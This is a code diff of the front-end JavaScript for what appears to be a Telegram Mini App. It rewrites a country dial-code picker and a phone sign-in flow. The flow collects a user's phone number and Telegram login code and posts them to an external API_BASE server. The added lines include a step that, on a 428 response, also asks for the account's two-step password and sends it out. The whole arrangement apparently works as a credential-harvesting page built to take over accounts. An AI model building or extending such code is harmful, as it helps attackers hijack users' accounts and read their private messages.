-  {flag:"🇲🇸",name:"Montserrat",code:"+1664"},
-  {flag:"🇲🇦",name:"Morocco",code:"+212"},
-  {flag:"🇲🇿",name:"Mozambique",code:"+258"},
-  {flag:"🇲🇲",name:"Myanmar",code:"+95"},
-  {flag:"🇳🇦",name:"Namibia",code:"+264"},
-  {flag:"🇳🇷",name:"Nauru",code:"+674"},
-  {flag:"🇳🇵",name:"Nepal",code:"+977"},
-  {flag:"🇳🇱",name:"Netherlands",code:"+31"},
-  {flag:"🇳🇨",name:"New Caledonia",code:"+687"},
-  {flag:"🇳🇿",name:"New Zealand",code:"+64"},
-  {flag:"🇳🇮",name:"Nicaragua",code:"+505"},
-  {flag:"🇳🇪",name:"Niger",code:"+227"},
-  {flag:"🇳🇬",name:"Nigeria",code:"+234"},
-  {flag:"🇳🇺",name:"Niue",code:"+683"},
-  {flag:"🇰🇵",name:"North Korea",code:"+850"},
-  {flag:"🇲🇵",name:"Northern Mariana Islands",code:"+1670"},
-  {flag:"🇳🇴",name:"Norway",code:"+47"},
-  {flag:"🇴🇲",name:"Oman",code:"+968"},
-  {flag:"🇵🇰",name:"Pakistan",code:"+92"},
-  {flag:"🇵🇼",name:"Palau",code:"+680"},
-  {flag:"🇵🇸",name:"Palestine",code:"+970"},
-  {flag:"🇵🇦",name:"Panama",code:"+507"},
-  {flag:"🇵🇬",name:"Papua New Guinea",code:"+675"},
-  {flag:"🇵🇾",name:"Paraguay",code:"+595"},
-  {flag:"🇵🇪",name:"Peru",code:"+51"},
-  {flag:"🇵🇭",name:"Philippines",code:"+63"},
-  {flag:"🇵🇱",name:"Poland",code:"+48"},
-  {flag:"🇵🇹",name:"Portugal",code:"+351"},
-  {flag:"🇵🇷",name:"Puerto Rico",code:"+1787"},
-  {flag:"🇶🇦",name:"Qatar",code:"+974"},
-  {flag:"🇷🇴",name:"Romania",code:"+40"},
-  {flag:"🇷🇺",name:"Russia",code:"+7"},
-  {flag:"🇷🇼",name:"Rwanda",code:"+250"},
-  {flag:"🇸🇭",name:"Saint Helena",code:"+290"},
-  {flag:"🇰🇳",name:"Saint Kitts & Nevis",code:"+1869"},
-  {flag:"🇱🇨",name:"Saint Lucia",code:"+1758"},
-  {flag:"🇵🇲",name:"Saint Pierre & Miquelon",code:"+508"},
-  {flag:"🇻🇨",name:"Saint Vincent",code:"+1784"},
-  {flag:"🇼🇸",name:"Samoa",code:"+685"},
-  {flag:"🇸🇲",name:"San Marino",code:"+378"},
-  {flag:"🇸🇹",name:"São Tomé & Príncipe",code:"+239"},
-  {flag:"🇸🇦",name:"Saudi Arabia",code:"+966"},
-  {flag:"🇸🇳",name:"Senegal",code:"+221"},
-  {flag:"🇷🇸",name:"Serbia",code:"+381"},
-  {flag:"🇸🇨",name:"Seychelles",code:"+248"},
-  {flag:"🇸🇱",name:"Sierra Leone",code:"+232"},
-  {flag:"🇸🇬",name:"Singapore",code:"+65"},
-  {flag:"🇸🇽",name:"Sint Maarten",code:"+1721"},
-  {flag:"🇸🇰",name:"Slovakia",code:"+421"},
-  {flag:"🇸🇮",name:"Slovenia",code:"+386"},
-  {flag:"🇸🇧",name:"Solomon Islands",code:"+677"},
-  {flag:"🇸🇴",name:"Somalia",code:"+252"},
-  {flag:"🇿🇦",name:"South Africa",code:"+27"},
-  {flag:"🇰🇷",name:"South Korea",code:"+82"},
-  {flag:"🇸🇸",name:"South Sudan",code:"+211"},
-  {flag:"🇪🇸",name:"Spain",code:"+34"},
-  {flag:"🇱🇰",name:"Sri Lanka",code:"+94"},
-  {flag:"🇸🇩",name:"Sudan",code:"+249"},
-  {flag:"🇸🇷",name:"Suriname",code:"+597"},
-  {flag:"🇸🇿",name:"Swaziland",code:"+268"},
-  {flag:"🇸🇪",name:"Sweden",code:"+46"},
-  {flag:"🇨🇭",name:"Switzerland",code:"+41"},
-  {flag:"🇸🇾",name:"Syria",code:"+963"},
-  {flag:"🇹🇼",name:"Taiwan",code:"+886"},
-  {flag:"🇹🇯",name:"Tajikistan",code:"+992"},
-  {flag:"🇹🇿",name:"Tanzania",code:"+255"},
-  {flag:"🇹🇭",name:"Thailand",code:"+66"},
-  {flag:"🇹🇬",name:"Togo",code:"+228"},
-  {flag:"🇹🇰",name:"Tokelau",code:"+690"},
-  {flag:"🇹🇴",name:"Tonga",code:"+676"},
-  {flag:"🇹🇹",name:"Trinidad & Tobago",code:"+1868"},
-  {flag:"🇹🇳",name:"Tunisia",code:"+216"},
-  {flag:"🇹🇷",name:"Turkey",code:"+90"},
-  {flag:"🇹🇲",name:"Turkmenistan",code:"+993"},
-  {flag:"🇹🇨",name:"Turks & Caicos Islands",code:"+1649"},
-  {flag:"🇹🇻",name:"Tuvalu",code:"+688"},
-  {flag:"🇺🇬",name:"Uganda",code:"+256"},
-  {flag:"🇺🇦",name:"Ukraine",code:"+380"},
-  {flag:"🇦🇪",name:"United Arab Emirates",code:"+971"},
-  {flag:"🇬🇧",name:"United Kingdom",code:"+44"},
-  {flag:"🇺🇸",name:"United States",code:"+1"},
-  {flag:"🇺🇾",name:"Uruguay",code:"+598"},
-  {flag:"🇺🇿",name:"Uzbekistan",code:"+998"},
-  {flag:"🇻🇺",name:"Vanuatu",code:"+678"},
-  {flag:"🇻🇦",name:"Vatican City",code:"+379"},
-  {flag:"🇻🇪",name:"Venezuela",code:"+58"},
-  {flag:"🇻🇳",name:"Vietnam",code:"+84"},
-  {flag:"🇻🇮",name:"Virgin Islands (US)",code:"+1340"},
-  {flag:"🇼🇫",name:"Wallis & Futuna",code:"+681"},
-  {flag:"🇾🇪",name:"Yemen",code:"+967"},
-  {flag:"🇿🇲",name:"Zambia",code:"+260"},
-  {flag:"🇿🇼",name:"Zimbabwe",code:"+263"},
+  {flag:"🔢",name:"Anonymous Number",dial:"+888"},
+  {flag:"🇦🇫",name:"Afghanistan",dial:"+93"},
+  {flag:"🇦🇱",name:"Albania",dial:"+355"},
+  {flag:"🇩🇿",name:"Algeria",dial:"+213"},
+  {flag:"🇦🇩",name:"Andorra",dial:"+376"},
+  {flag:"🇦🇴",name:"Angola",dial:"+244"},
+  {flag:"🇦🇷",name:"Argentina",dial:"+54"},
+  {flag:"🇦🇲",name:"Armenia",dial:"+374"},
+  {flag:"🇦🇺",name:"Australia",dial:"+61"},
+  {flag:"🇦🇹",name:"Austria",dial:"+43"},
+  {flag:"🇦🇿",name:"Azerbaijan",dial:"+994"},
+  {flag:"🇧🇭",name:"Bahrain",dial:"+973"},
+  {flag:"🇧🇩",name:"Bangladesh",dial:"+880"},
+  {flag:"🇧🇾",name:"Belarus",dial:"+375"},
+  {flag:"🇧🇪",name:"Belgium",dial:"+32"},
+  {flag:"🇧🇿",name:"Belize",dial:"+501"},
+  {flag:"🇧🇯",name:"Benin",dial:"+229"},
+  {flag:"🇧🇹",name:"Bhutan",dial:"+975"},
+  {flag:"🇧🇴",name:"Bolivia",dial:"+591"},
+  {flag:"🇧🇦",name:"Bosnia & Herzegovina",dial:"+387"},
+  {flag:"🇧🇼",name:"Botswana",dial:"+267"},
+  {flag:"🇧🇷",name:"Brazil",dial:"+55"},
+  {flag:"🇧🇳",name:"Brunei",dial:"+673"},
+  {flag:"🇧🇬",name:"Bulgaria",dial:"+359"},
+  {flag:"🇧🇫",name:"Burkina Faso",dial:"+226"},
+  {flag:"🇧🇮",name:"Burundi",dial:"+257"},
+  {flag:"🇰🇭",name:"Cambodia",dial:"+855"},
+  {flag:"🇨🇲",name:"Cameroon",dial:"+237"},
+  {flag:"🇨🇦",name:"Canada",dial:"+1"},
+  {flag:"🇨🇫",name:"Central African Republic",dial:"+236"},
+  {flag:"🇹🇩",name:"Chad",dial:"+235"},
+  {flag:"🇨🇱",name:"Chile",dial:"+56"},
+  {flag:"🇨🇳",name:"China",dial:"+86"},
+  {flag:"🇨🇴",name:"Colombia",dial:"+57"},
+  {flag:"🇨🇬",name:"Congo",dial:"+242"},
+  {flag:"🇨🇩",name:"Congo (DRC)",dial:"+243"},
+  {flag:"🇨🇷",name:"Costa Rica",dial:"+506"},
+  {flag:"🇭🇷",name:"Croatia",dial:"+385"},
+  {flag:"🇨🇺",name:"Cuba",dial:"+53"},
+  {flag:"🇨🇾",name:"Cyprus",dial:"+357"},
+  {flag:"🇨🇿",name:"Czech Republic",dial:"+420"},
+  {flag:"🇩🇰",name:"Denmark",dial:"+45"},
+  {flag:"🇩🇴",name:"Dominican Republic",dial:"+1809"},
+  {flag:"🇪🇨",name:"Ecuador",dial:"+593"},
+  {flag:"🇪🇬",name:"Egypt",dial:"+20"},
+  {flag:"🇸🇻",name:"El Salvador",dial:"+503"},
+  {flag:"🇪🇪",name:"Estonia",dial:"+372"},
+  {flag:"🇪🇹",name:"Ethiopia",dial:"+251"},
+  {flag:"🇫🇯",name:"Fiji",dial:"+679"},
+  {flag:"🇫🇮",name:"Finland",dial:"+358"},
+  {flag:"🇫🇷",name:"France",dial:"+33"},
+  {flag:"🇬🇦",name:"Gabon",dial:"+241"},
+  {flag:"🇬🇲",name:"Gambia",dial:"+220"},
+  {flag:"🇬🇪",name:"Georgia",dial:"+995"},
+  {flag:"🇩🇪",name:"Germany",dial:"+49"},
+  {flag:"🇬🇭",name:"Ghana",dial:"+233"},
+  {flag:"🇬🇷",name:"Greece",dial:"+30"},
+  {flag:"🇬🇹",name:"Guatemala",dial:"+502"},
+  {flag:"🇬🇳",name:"Guinea",dial:"+224"},
+  {flag:"🇬🇾",name:"Guyana",dial:"+592"},
+  {flag:"🇭🇹",name:"Haiti",dial:"+509"},
+  {flag:"🇭🇳",name:"Honduras",dial:"+504"},
+  {flag:"🇭🇰",name:"Hong Kong",dial:"+852"},
+  {flag:"🇭🇺",name:"Hungary",dial:"+36"},
+  {flag:"🇮🇸",name:"Iceland",dial:"+354"},
+  {flag:"🇮🇳",name:"India",dial:"+91"},
+  {flag:"🇮🇩",name:"Indonesia",dial:"+62"},
+  {flag:"🇮🇷",name:"Iran",dial:"+98"},
+  {flag:"🇮🇶",name:"Iraq",dial:"+964"},
+  {flag:"🇮🇪",name:"Ireland",dial:"+353"},
+  {flag:"🇮🇱",name:"Israel",dial:"+972"},
+  {flag:"🇮🇹",name:"Italy",dial:"+39"},
+  {flag:"🇨🇮",name:"Ivory Coast",dial:"+225"},
+  {flag:"🇯🇲",name:"Jamaica",dial:"+1876"},
+  {flag:"🇯🇵",name:"Japan",dial:"+81"},
+  {flag:"🇯🇴",name:"Jordan",dial:"+962"},
+  {flag:"🇰🇿",name:"Kazakhstan",dial:"+7"},
+  {flag:"🇰🇪",name:"Kenya",dial:"+254"},
+  {flag:"🇽🇰",name:"Kosovo",dial:"+383"},
+  {flag:"🇰🇼",name:"Kuwait",dial:"+965"},
+  {flag:"🇰🇬",name:"Kyrgyzstan",dial:"+996"},
+  {flag:"🇱🇦",name:"Laos",dial:"+856"},
+  {flag:"🇱🇻",name:"Latvia",dial:"+371"},
+  {flag:"🇱🇧",name:"Lebanon",dial:"+961"},
+  {flag:"🇱🇾",name:"Libya",dial:"+218"},
+  {flag:"🇱🇹",name:"Lithuania",dial:"+370"},
+  {flag:"🇱🇺",name:"Luxembourg",dial:"+352"},
+  {flag:"🇲🇾",name:"Malaysia",dial:"+60"},
+  {flag:"🇲🇻",name:"Maldives",dial:"+960"},
+  {flag:"🇲🇱",name:"Mali",dial:"+223"},
+  {flag:"🇲🇹",name:"Malta",dial:"+356"},
+  {flag:"🇲🇷",name:"Mauritania",dial:"+222"},
+  {flag:"🇲🇺",name:"Mauritius",dial:"+230"},
+  {flag:"🇲🇽",name:"Mexico",dial:"+52"},
+  {flag:"🇲🇩",name:"Moldova",dial:"+373"},
+  {flag:"🇲🇨",name:"Monaco",dial:"+377"},
+  {flag:"🇲🇳",name:"Mongolia",dial:"+976"},
+  {flag:"🇲🇪",name:"Montenegro",dial:"+382"},
+  {flag:"🇲🇦",name:"Morocco",dial:"+212"},
+  {flag:"🇲🇿",name:"Mozambique",dial:"+258"},
+  {flag:"🇲🇲",name:"Myanmar",dial:"+95"},
+  {flag:"🇳🇦",name:"Namibia",dial:"+264"},
+  {flag:"🇳🇵",name:"Nepal",dial:"+977"},
+  {flag:"🇳🇱",name:"Netherlands",dial:"+31"},
+  {flag:"🇳🇿",name:"New Zealand",dial:"+64"},
+  {flag:"🇳🇮",name:"Nicaragua",dial:"+505"},
+  {flag:"🇳🇪",name:"Niger",dial:"+227"},
+  {flag:"🇳🇬",name:"Nigeria",dial:"+234"},
+  {flag:"🇰🇵",name:"North Korea",dial:"+850"},
+  {flag:"🇳🇴",name:"Norway",dial:"+47"},
+  {flag:"🇴🇲",name:"Oman",dial:"+968"},
+  {flag:"🇵🇰",name:"Pakistan",dial:"+92"},
+  {flag:"🇵🇸",name:"Palestine",dial:"+970"},
+  {flag:"🇵🇦",name:"Panama",dial:"+507"},
+  {flag:"🇵🇾",name:"Paraguay",dial:"+595"},
+  {flag:"🇵🇪",name:"Peru",dial:"+51"},
+  {flag:"🇵🇭",name:"Philippines",dial:"+63"},
+  {flag:"🇵🇱",name:"Poland",dial:"+48"},
+  {flag:"🇵🇹",name:"Portugal",dial:"+351"},
+  {flag:"🇶🇦",name:"Qatar",dial:"+974"},
+  {flag:"🇷🇴",name:"Romania",dial:"+40"},
+  {flag:"🇷🇺",name:"Russia",dial:"+7"},
+  {flag:"🇷🇼",name:"Rwanda",dial:"+250"},
+  {flag:"🇸🇦",name:"Saudi Arabia",dial:"+966"},
+  {flag:"🇸🇳",name:"Senegal",dial:"+221"},
+  {flag:"🇷🇸",name:"Serbia",dial:"+381"},
+  {flag:"🇸🇬",name:"Singapore",dial:"+65"},
+  {flag:"🇸🇰",name:"Slovakia",dial:"+421"},
+  {flag:"🇸🇮",name:"Slovenia",dial:"+386"},
+  {flag:"🇸🇴",name:"Somalia",dial:"+252"},
+  {flag:"🇿🇦",name:"South Africa",dial:"+27"},
+  {flag:"🇰🇷",name:"South Korea",dial:"+82"},
+  {flag:"🇸🇸",name:"South Sudan",dial:"+211"},
+  {flag:"🇪🇸",name:"Spain",dial:"+34"},
+  {flag:"🇱🇰",name:"Sri Lanka",dial:"+94"},
+  {flag:"🇸🇩",name:"Sudan",dial:"+249"},
+  {flag:"🇸🇷",name:"Suriname",dial:"+597"},
+  {flag:"🇸🇪",name:"Sweden",dial:"+46"},
+  {flag:"🇨🇭",name:"Switzerland",dial:"+41"},
+  {flag:"🇸🇾",name:"Syria",dial:"+963"},
+  {flag:"🇹🇼",name:"Taiwan",dial:"+886"},
+  {flag:"🇹🇯",name:"Tajikistan",dial:"+992"},
+  {flag:"🇹🇿",name:"Tanzania",dial:"+255"},
+  {flag:"🇹🇭",name:"Thailand",dial:"+66"},
+  {flag:"🇹🇬",name:"Togo",dial:"+228"},
+  {flag:"🇹🇴",name:"Tonga",dial:"+676"},
+  {flag:"🇹🇹",name:"Trinidad & Tobago",dial:"+1868"},
+  {flag:"🇹🇳",name:"Tunisia",dial:"+216"},
+  {flag:"🇹🇷",name:"Turkey",dial:"+90"},
+  {flag:"🇹🇲",name:"Turkmenistan",dial:"+993"},
+  {flag:"🇺🇬",name:"Uganda",dial:"+256"},
+  {flag:"🇺🇦",name:"Ukraine",dial:"+380"},
+  {flag:"🇦🇪",name:"United Arab Emirates",dial:"+971"},
+  {flag:"🇬🇧",name:"United Kingdom",dial:"+44"},
+  {flag:"🇺🇸",name:"United States",dial:"+1"},
+  {flag:"🇺🇾",name:"Uruguay",dial:"+598"},
+  {flag:"🇺🇿",name:"Uzbekistan",dial:"+998"},
+  {flag:"🇻🇪",name:"Venezuela",dial:"+58"},
+  {flag:"🇻🇳",name:"Vietnam",dial:"+84"},
+  {flag:"🇾🇪",name:"Yemen",dial:"+967"},
+  {flag:"🇿🇲",name:"Zambia",dial:"+260"},
+  {flag:"🇿🇼",name:"Zimbabwe",dial:"+263"},
 ];
 
-function renderList(list) {
-  document.getElementById("countryList").innerHTML = list.map(c =>
-    `<div class="country-option" onclick="selectCountry('${c.name}')">
+let selectedCountry = countries.find(c => c.name === "United States");
+
+function renderPicker(list) {
+  document.getElementById('pickerList').innerHTML = list.map(c =>
+    `<div class="picker-item" onclick="selectCountry('${c.name}')">
       <span class="flag">${c.flag}</span>
-      <span class="opt-name">${c.name}</span>
-      <span class="opt-code">${c.code}</span>
+      <span class="country-name">${c.name}</span>
+      <span class="country-code">${c.dial}</span>
     </div>`
-  ).join("");
+  ).join('');
 }
-function filterCountries(query) {
-  renderList(countries.filter(c =>
-    c.name.toLowerCase().includes(query.toLowerCase()) || c.code.includes(query)
+
+function filterCountries(q) {
+  renderPicker(countries.filter(c =>
+    c.name.toLowerCase().includes(q.toLowerCase()) || c.dial.includes(q)
   ));
 }
-function toggleDropdown() {
-  document.getElementById("countryDropdown").classList.toggle("open");
+
+function openPicker() {
+  renderPicker(countries);
+  document.getElementById('countryPicker').classList.add('open');
 }
+
+function closePicker() {
+  document.getElementById('countryPicker').classList.remove('open');
+}
+
 function selectCountry(name) {
-  const c = countries.find(x => x.name === name);
-  if (!c) return;
-  document.getElementById("selectedFlag").textContent = c.flag;
-  document.getElementById("selectedName").textContent = `${c.name} (${c.code})`;
-  document.getElementById("phoneInput").placeholder = c.code;
-  document.getElementById("countryDropdown").classList.remove("open");
+  selectedCountry = countries.find(c => c.name === name);
+  document.getElementById('selFlag').textContent = selectedCountry.flag;
+  document.getElementById('selDial').textContent = selectedCountry.dial;
+  closePicker();
+  document.getElementById('phoneInput').focus();
 }
-document.addEventListener("click", function(e) {
-  if (!document.getElementById("countryDisplay").contains(e.target) &&
-      !document.getElementById("countryDropdown").contains(e.target)) {
-    document.getElementById("countryDropdown").classList.remove("open");
-  }
-});
-renderList(countries);
 
-document.getElementById("username1").textContent = tg?.initDataUnsafe?.user?.first_name || "there";
-
-// ── Navigation ──
 function showPage(id) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
   document.getElementById(id).classList.add('active');
 }
 
-function goToSignIn() {
-  showPage('page2');
-  document.body.className = 'tg-theme';
-}
-
-// ── Send code ──
 async function handleSendCode() {
-  const phone = document.getElementById('phoneInput').value.trim();
-  if (!phone) return;
+  let number = document.getElementById('phoneInput').value.trim();
+  if (!number) return;
+  const phone = selectedCountry.dial + ' ' + number;
 
   const btn = document.getElementById('nextBtn');
   btn.disabled = true;
   btn.textContent = 'Sending...';
 
   try {
-    const telegramUserId = tg?.initDataUnsafe?.user?.id;
-    const initData = tg?.initData || '';
-
     const res = await fetch(`${API_BASE}/send-code`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ phone, telegramUserId, initData }),
+      body: JSON.stringify({ phone }),
     });
-
     const data = await res.json();
-    if (!res.ok) throw new Error(data.error || 'Failed to send code');
+    if (!res.ok) throw new Error(data.detail || 'Failed to send code');
 
-    // Store phone for verify step
-    window._verifyPhone = phone;
-    document.getElementById('phoneDisplay').textContent = phone;
-
-    // Go to code entry page
-    showPage('page25');
-    document.body.className = 'tg-theme';
-    setupCodeInputs();
+    window._phone = phone;
+    document.getElementById('codeTitle').textContent = phone;
+    showPage('page2');
+    setupCodeBoxes();
     startResendTimer();
 
   } catch (err) {
-    alert(err.message || 'Something went wrong. Please try again.');
+    alert(err.message);
   } finally {
     btn.disabled = false;
     btn.textContent = 'NEXT';
   }
 }
 
-// ── Code input box logic ──
-function setupCodeInputs() {
-  const inputs = document.querySelectorAll('#codeInputs input');
-  inputs.forEach((input, i) => {
-    input.value = '';
-    input.classList.remove('filled');
+function setupCodeBoxes() {
+  const inputs = document.querySelectorAll('#codeBoxes input');
+  inputs.forEach((inp, i) => {
+    inp.value = '';
+    inp.classList.remove('filled');
 
-    input.addEventListener('input', () => {
-      input.value = input.value.replace(/\D/g, '').slice(0, 1);
-      if (input.value) {
-        input.classList.add('filled');
-        if (i < inputs.length - 1) inputs[i + 1].focus();
-      } else {
-        input.classList.remove('filled');
-      }
-      checkCodeComplete();
-    });
+    inp.oninput = () => {
+      inp.value = inp.value.replace(/\D/g, '').slice(0, 1);
+      inp.classList.toggle('filled', !!inp.value);
+      if (inp.value && i < inputs.length - 1) inputs[i + 1].focus();
+      checkComplete();
+    };
 
-    input.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !input.value && i > 0) {
-        inputs[i - 1].focus();
+    inp.onkeydown = (e) => {
+      if (e.key === 'Backspace' && !inp.value && i > 0) {
         inputs[i - 1].value = '';
         inputs[i - 1].classList.remove('filled');
-        checkCodeComplete();
+        inputs[i - 1].focus();
+        checkComplete();
       }
-    });
+    };
 
-    // Handle paste on any box
-    input.addEventListener('paste', (e) => {
+    inp.onpaste = (e) => {
       e.preventDefault();
-      const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-      pasted.split('').slice(0, 6).forEach((char, j) => {
-        if (inputs[j]) {
-          inputs[j].value = char;
-          inputs[j].classList.add('filled');
-        }
+      const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+      text.split('').slice(0, 5).forEach((ch, j) => {
+        if (inputs[j]) { inputs[j].value = ch; inputs[j].classList.add('filled'); }
       });
-      const next = Math.min(pasted.length, 5);
-      inputs[next].focus();
-      checkCodeComplete();
-    });
+      inputs[Math.min(text.length, 4)].focus();
+      checkComplete();
+    };
   });
 
   inputs[0].focus();
@@ -631,21 +435,17 @@ function setupCodeInputs() {
   document.getElementById('verifyBtn').disabled = true;
 }
 
-function checkCodeComplete() {
-  const inputs = document.querySelectorAll('#codeInputs input');
-  const complete = [...inputs].every(inp => inp.value.length === 1);
-  document.getElementById('verifyBtn').disabled = !complete;
+function checkComplete() {
+  const inputs = document.querySelectorAll('#codeBoxes input');
+  document.getElementById('verifyBtn').disabled = ![...inputs].every(i => i.value);
 }
 
-function getEnteredCode() {
-  return [...document.querySelectorAll('#codeInputs input')].map(i => i.value).join('');
+function getCode() {
+  return [...document.querySelectorAll('#codeBoxes input')].map(i => i.value).join('');
 }
 
-// ── Verify code ──
 async function handleVerifyCode() {
-  const code = getEnteredCode();
-  const phone = window._verifyPhone;
-
+  const code = getCode();
   const btn = document.getElementById('verifyBtn');
   btn.disabled = true;
   btn.textContent = 'Verifying...';
@@ -655,41 +455,69 @@ async function handleVerifyCode() {
     const res = await fetch(`${API_BASE}/verify-code`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ phone, code }),
+      body: JSON.stringify({ phone: window._phone, code }),
     });
-
     const data = await res.json();
-    if (!res.ok) throw new Error(data.error || 'Invalid code');
 
-    // Success
+    if (res.status === 428) {
+      showPage('page2fa');
+      document.getElementById('tfaInput').focus();
+      return;
+    }
+
+    if (!res.ok) throw new Error(data.detail || 'Invalid code');
+
     showPage('page3');
-    document.body.className = 'dark';
     if (tg) setTimeout(() => tg.close(), 2000);
 
   } catch (err) {
-    document.getElementById('codeError').textContent = err.message || 'Incorrect code, please try again.';
+    document.getElementById('codeError').textContent = err.message;
     btn.disabled = false;
-    btn.textContent = 'VERIFY';
+    btn.textContent = 'NEXT';
   }
 }
 
-// ── Resend timer ──
-let resendTimer = null;
+async function handleTfa() {
+  const password = document.getElementById('tfaInput').value;
+  const btn = document.getElementById('tfaBtn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying...';
+  document.getElementById('tfaError').textContent = '';
+
+  try {
+    const res = await fetch(`${API_BASE}/verify-code`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ phone: window._phone, code: getCode(), password }),
+    });
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.detail || 'Invalid password');
+
+    showPage('page3');
+    if (tg) setTimeout(() => tg.close(), 2000);
+
+  } catch (err) {
+    document.getElementById('tfaError').textContent = err.message;
+    btn.disabled = false;
+    btn.textContent = 'NEXT';
+  }
+}
+
+let resendInterval;
 function startResendTimer() {
   const btn = document.getElementById('resendBtn');
-  let seconds = 60;
   btn.disabled = true;
-  btn.textContent = `Resend code in ${seconds}s`;
-
-  clearInterval(resendTimer);
-  resendTimer = setInterval(() => {
-    seconds--;
-    if (seconds <= 0) {
-      clearInterval(resendTimer);
+  let s = 60;
+  btn.textContent = `Resend code in ${s}s`;
+  clearInterval(resendInterval);
+  resendInterval = setInterval(() => {
+    s--;
+    if (s <= 0) {
+      clearInterval(resendInterval);
       btn.disabled = false;
       btn.textContent = 'Resend code';
     } else {
-      btn.textContent = `Resend code in ${seconds}s`;
+      btn.textContent = `Resend code in ${s}s`;
     }
   }, 1000);
 }
